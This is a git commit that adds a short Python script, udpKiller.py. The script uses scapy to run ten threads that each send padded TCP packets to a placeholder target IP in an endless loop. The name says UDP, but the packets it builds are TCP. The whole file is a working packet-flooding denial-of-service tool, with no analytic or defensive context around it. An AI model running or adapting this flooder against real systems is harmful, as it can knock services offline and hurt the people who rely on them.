35a63abcb06c3b562744e2f032ceb7d5fc06b1ff
root <root@localhost.localdomain>
2017-04-11 15:41:21 +0100

    First Commit

---
+++ udpKiller.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python
+
+import thread 
+from scapy.all import *
+
+def worker(id):
+
+    msg = 'A' * 250
+    pkt = IP(dst='<target_ip>')/TCP()/msg
+    while True:
+        send(pkt)
+
+for i in range(10):
+    print "starting thread" + str(i)
+    thread.start_new_thread(worker, (i,))
+
+while True:
+    pass
